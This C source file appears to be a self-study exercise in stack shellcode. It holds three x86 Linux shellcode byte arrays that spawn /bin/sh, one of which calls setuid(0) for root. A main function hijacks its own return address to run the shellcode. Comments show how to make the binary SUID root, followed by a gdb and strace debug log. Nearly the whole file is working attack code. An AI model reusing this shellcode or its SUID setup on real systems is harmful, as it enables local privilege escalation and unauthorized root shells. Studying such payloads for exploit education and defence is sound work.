#include <stdio.h>

#define DU 2

// char *name[2];
// name[0] = "/bin/sh";
// name[1] = 0x0;
// execve(name[0], name, 0x0);
// exit(0);

#if DU == 1
// execve system call bad address for EDX error
char shellcode[] = 
"\xeb\x1e\x31\xc0\x50\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89"
"\xe1\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40"
"\xcd\x80\xe8\xdd\xff\xff\xff";

#elif DU == 2
// avoid end with NULL
// use setuid to get root privileges
char shellcode[] = 
"\xeb\x29"
"\x31\xc0" // setuid(0);
"\xb0\x17"
"\x31\xdb"
"\xcd\x80"
"\x31\xc0" // execve("//bin/sh", ["//bin/sh"], NULL);
"\x50"
"\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x31\xd2"
"\xb0\x0b"
"\xcd\x80"
"\x31\xdb"
"\x31\xc0"
"\xb0\x01"
"\xcd\x80"
"\xe8\xd2\xff\xff\xff"
"\x30\x30"; // it is not necessary end with NULL

#else
char shellcode[] = 
"\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd"
"\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68"; // must end with NULL

#endif

int main() {
#if 0
	printf(" UID\t= %d\n", getuid());
	printf(" EUID\t= %d\n", geteuid());
	printf(" GID\t= %d\n", getgid());
	printf(" EGID\t= %d\n", getegid());
	char* name[2];
	name[0] = "/bin/sh";
	name[1] = NULL;
	setuid(0); // to get the root privileges, provided that it has SUID
	execve(name[0], name, NULL);
	return 0;
#endif
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int)shellcode;
}

// $ ls -al ./stack-shellcode
// -rwxr-xr-x. 1 root root 6027 Feb  3 16:13 ./stack-shellcode
//
// $ sudo chown root:root ./stack-shellcode
// $ sudo chmod +s ./stack-shellcode # set user or group ID on execution (s)
// $ ls -al ./stack-shellcode
// -rwsr-sr-x. 1 root root 6027 Feb  3 16:13 ./stack-shellcode
// $ ./stack-shellcode
// 
// ==============================================
// DEBUG LOG
// ==============================================
// 1. system call execve failed with errno -14 (Bad Address)
// -------------------------------------------
// (gdb) b *shellcode 
// Breakpoint 2 at 0x804960c
// (gdb) c
// Continuing.
//
// Breakpoint 2, 0x0804960c in shellcode ()
// (gdb) disassemble 
// Dump of assembler code for function shellcode:
// => 0x0804960c <+0>:	jmp    0x8049625 <shellcode+25>
//    0x0804960e <+2>:	xor    %eax,%eax
//    0x08049610 <+4>:	push   %eax
//    0x08049611 <+5>:	push   $0x68732f6e
//    0x08049616 <+10>:	push   $0x69622f2f
//    0x0804961b <+15>:	mov    %esp,%ebx
//    0x0804961d <+17>:	push   %eax
//    0x0804961e <+18>:	push   %ebx
//    0x0804961f <+19>:	mov    %esp,%ecx
//    0x08049621 <+21>:	mov    $0xb,%al
//    0x08049623 <+23>:	int    $0x80
//    0x08049625 <+25>:	call   0x804960e <shellcode+2>
//    0x0804962a <+30>:	add    %al,(%eax)
// End of assembler dump.
// (gdb) si
// 0x08049625 in shellcode ()
// (gdb) si
// 0x0804960e in shellcode ()
// (gdb) ni 
// ...
// (gdb) ni
// 0x08049625 in shellcode ()
// (gdb) info reg
// eax            0xfffffff2	-14
//
// $strace ./stack-shellcode
// execve("//bin/sh", ["//bin/sh"], [/* 8 vars */]) = -1 EFAULT (Bad address)
//
